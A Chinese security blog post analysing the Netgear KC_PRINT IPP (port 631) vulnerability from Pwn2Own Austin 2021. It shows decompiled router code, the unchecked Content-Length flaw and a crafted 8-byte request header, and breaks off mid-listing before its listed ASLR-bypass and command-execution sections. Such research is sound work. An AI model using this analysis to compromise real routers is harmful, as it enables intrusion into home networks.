<!DOCTYPE html>
<html lang=EN>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta property="og:type" content="article">
<meta property="og:title" content="Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析">
<meta property="og:url" content="https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html">
<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">
<meta property="og:locale">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e66939850217aae2c222c419224b1d80-7753dc.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-20a0f61dacf5f6c238e2e5917b83659f-4734c8.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-1d0be4ee778833f6e89bf8f2b9769be9-750d1f.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-763f460331a41355beb24dcb1b383c47-159298.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e8f8895596ce61800699e533f9d7c442-efc4ee.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-657974c446c112a83a99c724fa6581d1-a39218.png">
<meta property="article:published_time" content="2022-09-08T08:06:00.000Z">
<meta property="article:modified_time" content="2022-09-08T06:56:38.000Z">
<meta property="article:author" content="Swing">
<meta property="article:tag" content="netgear">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e66939850217aae2c222c419224b1d80-7753dc.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 浮生若梦" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/CVE-2022-32548-DrayTeck-BufferOverflow.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2022-QWB-Final-RealWorld-Challenge-Writeup.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html&text=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html&title=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html&is_video=false&description=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析&body=Check out this article: https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html&title=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html&title=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html&title=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html&title=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html&name=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html&t=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%BC%96%E5%86%99"><span class="toc-number">2.</span> <span class="toc-text">利用编写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-ASLR"><span class="toc-number">2.1.</span> <span class="toc-text">Bypass ASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Arbitrary-command-execution"><span class="toc-number">2.2.</span> <span class="toc-text">Arbitrary command execution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Swing</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-09-08T08:06:00.000Z" itemprop="datePublished">2022-09-08</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/netgear/" rel="tag">netgear</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天 sectoday 推了一个关于 <code>NCC 研究员参加 Pwn2Own Austin 2021 比赛攻破路由器、NAS、打印机的技术细节分享</code> 的推送。</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e66939850217aae2c222c419224b1d80-7753dc.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e66939850217aae2c222c419224b1d80-7753dc.png"></a></p>
<p>其中有一个篇章是讲 Netgear  R6700 Router 的， 恰好我上上篇分享的文章 <a href="https://bestwing.me/PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html">PSV-2020-0437:Buffer-Overflow-on-Some-Netgear-Routers
</a> 所使用的路由器型号以及固件版本也在该漏洞影响范围之内。因此打算分析这个漏洞，并自己写一下这个漏洞的 exploit 。</p>
<p>注：</p>
<p>分析以及利用的路由器型号为： R6400v2 ， 固件版本为：V1.0.4.102_10.0.75</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>通过 slide 可以得知， nccgroup 所发现的漏洞在 <code>KC_PRINT</code>  这个程序里，所攻击端口为 <code>631</code> 端口。 根据我浅薄的知识，第一反映这是一个和 IPP (Internet Printing Protocol，缩写IPP, 是一个用于通过互联网打印文件的标准网络协议) 有关的程序。 在后面的进一步分析的过程中，确实验证了我的猜想。</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-20a0f61dacf5f6c238e2e5917b83659f-4734c8.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-20a0f61dacf5f6c238e2e5917b83659f-4734c8.png"></a></p>
<p><code>KC_PRINT</code> 使用不同的线程来处理不同的功能， </p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-1d0be4ee778833f6e89bf8f2b9769be9-750d1f.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-1d0be4ee778833f6e89bf8f2b9769be9-750d1f.png"></a></p>
<p>而该漏洞是发生在 <code>ipp_server</code> 线程里面的。 其大致入口代码如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( setsockopt(fd, <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>) &lt; <span class="number">0</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   perror(<span class="string">&quot;ipp_server: setsockopt SO_REUSEADDR failed&quot;</span>);</span><br><span class="line">   close(fd);</span><br><span class="line">   pthread_attr_destroy(&amp;attr);</span><br><span class="line">   pthread_exit(<span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> s.sa_family = <span class="number">2</span>;</span><br><span class="line"> *(_DWORD *)&amp;s.sa_data[<span class="number">2</span>] = htonl(<span class="number">0</span>);</span><br><span class="line"> *(_WORD *)s.sa_data = htons(<span class="number">631u</span>); </span><br><span class="line"> <span class="keyword">if</span> ( bind(fd, &amp;s, <span class="number">0x10</span>u) &lt; <span class="number">0</span> ) <span class="comment">// 在 631 端口监听</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"> listen(fd, <span class="number">128</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ( flag )</span><br><span class="line"> &#123;</span><br><span class="line">   newfd = accept(fd, &amp;addr, &amp;addr_len);</span><br><span class="line">   <span class="keyword">if</span> ( newfd &gt;= <span class="number">0</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     sub_A0FC(<span class="number">1</span>);</span><br><span class="line">     v1[<span class="number">0</span>] = <span class="number">60</span>;</span><br><span class="line">     v1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">if</span> ( setsockopt(newfd, <span class="number">1</span>, <span class="number">20</span>, v1, <span class="number">8u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">       perror(<span class="string">&quot;ipp_server: setsockopt SO_RCVTIMEO failed&quot;</span>);</span><br><span class="line">     Fd = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">     <span class="keyword">if</span> ( Fd )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="built_in">memset</span>(Fd, <span class="number">0</span>, <span class="number">8u</span>);</span><br><span class="line">       *Fd = newfd;</span><br><span class="line">       pthread_mutex_lock(&amp;stru_18B40);</span><br><span class="line">       v6 = sub_16068();</span><br><span class="line">       <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">       &#123;</span><br><span class="line">		...</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> ( pthread_create(&amp;dword_18740[v6], &amp;attr, do_ipp_http_thread, Fd) )</span><br><span class="line"></span><br><span class="line">		...</span><br></pre></td></tr></table></figure>
<p>然后会进入到  <code>do_ipp_http_thread</code> 函数里， 该函数会进一步调用一个 <code>do_http</code> 的函数。 该函数用来处理对应的 IPP 协议的 HTTP 请求。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">n = recv_n(fd, buf, <span class="number">1024</span>);</span><br><span class="line"><span class="keyword">if</span> ( n &lt;= <span class="number">0</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strstr</span>(buf, <span class="string">&quot;100-continue&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">HTTP_INPUT = <span class="built_in">strstr</span>(buf, <span class="string">&quot;POST /USB&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !HTTP_INPUT )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">HTTP_INPUT += <span class="number">9</span>;</span><br><span class="line">v18 = <span class="built_in">strstr</span>(HTTP_INPUT, <span class="string">&quot;_LQ&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v18 )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v13 = *v18;</span><br><span class="line">*v18 = <span class="number">0</span>;</span><br><span class="line">usblp_index = atoi(HTTP_INPUT);</span><br><span class="line">*v18 = v13;</span><br><span class="line"><span class="keyword">if</span> ( usblp_index &gt; <span class="number">10</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( !is_printer_connected(usblp_index) )     <span class="comment">// 检查是否有打印机设备挂载</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v22[<span class="number">1</span>] = usblp_index;</span><br><span class="line">HTTP_INPUT = <span class="built_in">strstr</span>(buf, <span class="string">&quot;Content-Length: &quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !HTTP_INPUT )</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">HTTP_INPUT += <span class="number">16</span>;</span><br><span class="line">v18 = <span class="built_in">strstr</span>(HTTP_INPUT, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v18 )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v13 = *v18;</span><br><span class="line">*v18 = <span class="number">0</span>;</span><br><span class="line">content_len = atoi(HTTP_INPUT);</span><br><span class="line">*v18 = v13;</span><br><span class="line"><span class="built_in">memset</span>(recv_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(recv_buf));</span><br><span class="line">n = recv(fd, recv_buf, <span class="number">8u</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( n != <span class="number">8</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( (recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">2</span>) &amp;&amp; (recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">6</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v14 = do_airippWithContentLength(v22, content_len, recv_buf);</span><br><span class="line">  <span class="keyword">if</span> ( v14 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>首先  <code>  n = recv_n(fd, buf, 1024);</code>  接收 1024 的消息，这一部分消息以  <code>\r\n</code> 作为结束标识， 然后会取出 <code>Content-Length: </code> 的值作为  <code>content_len</code> 传入 <code>do_airippWithContentLength</code> 函数中。</p>
<p>在调用 <code>do_airippWithContentLength</code>  函数之前， 还会读取一个 8 字节长度的消息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(recv_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(recv_buf));</span><br><span class="line">n = recv(fd, recv_buf, <span class="number">8u</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>该 8 字节长度的消息有一定的格式， 当满足 <code>(recv_buf[2] || recv_buf[3] != 2) &amp;&amp; (recv_buf[2] || recv_buf[3] != 6)</code> 条件的时候才会调用 <code>do_airippWithContentLength</code> 函数。</p>
<p>且进入到 <code>do_airippWithContentLength </code>函数后， 会根据这个 8 个字节长度的消息， 来决定进一步调用哪个函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">do_airippWithContentLength</span><span class="params">(<span class="keyword">int</span> *a1, <span class="keyword">size_t</span> content_len, <span class="keyword">const</span> <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *recv_buf; <span class="comment">// [sp+18h] [bp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+1Ch] [bp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> Jobs; <span class="comment">// [sp+24h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = *a1;</span><br><span class="line">  recv_buf = <span class="built_in">malloc</span>(content_len);</span><br><span class="line">  <span class="keyword">if</span> ( !recv_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(recv_buf, buf, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( toRead(v8, (recv_buf + <span class="number">8</span>), content_len - <span class="number">8</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">8</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">9</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">10</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">5</span> )</span><br><span class="line">                Jobs = sub_D0C8(a1, recv_buf);</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                Jobs = Response_Create_Job(a1, recv_buf, content_len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              Jobs = Response_Get_Jobs(a1, recv_buf, content_len);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            Jobs = Response_Get_Job_Attributes(a1, recv_buf, content_len);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Client %d: Cancel-Job\n&quot;</span>, v8);</span><br><span class="line">          Jobs = sub_10EA0(a1, recv_buf);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>例如此处， 如果我们想调用 <code>Response_Get_Jobs</code> 函数， 我们就得进一步满足 <code> recv_buf[2] || recv_buf[3] == 10</code>  的条件， 才能进到 <code>Response_Get_Jobs</code> 函数里。因此我们可以构造如下的消息：</p>
<p><code>b&#39;\x00\x00\x00\x0a\x00\x00\x99\x99&#39;</code>  让其满足下标为 3 的时候 为 <code>10</code>  即可。 </p>
<p>另外， 在 <code>do_http</code> 函数中有一个 <code>  if ( !is_printer_connected(usblp_index) )     // 检查是否有打印机设备挂载</code> 的判断，该函数会读取 <code>/proc/printer_status</code> 的内容来判断是否有打印机挂载。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( printer_status )</span><br><span class="line">&#123;</span><br><span class="line">  fd = open(<span class="string">&quot;/proc/printer_status&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(printer_status, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">    v7 = read(fd, printer_status, <span class="number">0x400</span>u);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(printer_status + v7) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">      <span class="built_in">snprintf</span>(s, <span class="number">0x10</span>u, <span class="string">&quot;usblp%d&quot;</span>, usblp_index - <span class="number">1</span>);</span><br><span class="line">      v7 = <span class="built_in">strstr</span>(printer_status, s) != <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(printer_status);</span><br><span class="line">      printer_status = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这里我没有挂载打印机，因此我通过 gdb 来绕过这个判断。</p>
<p>此时已经进到 <code>do_airippWithContentLength</code> 函数，  该函数会进一步根据 <code>content-len - 8</code>  读取后续的更多消息内容。而这个 <code>content-len</code>  是没有进行长度检查的，这里以 <code>Response_Get_Jobs</code> 函数为例， 来做进一步的分析。</p>
<p>在 <code>Response_Get_Jobs</code> 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 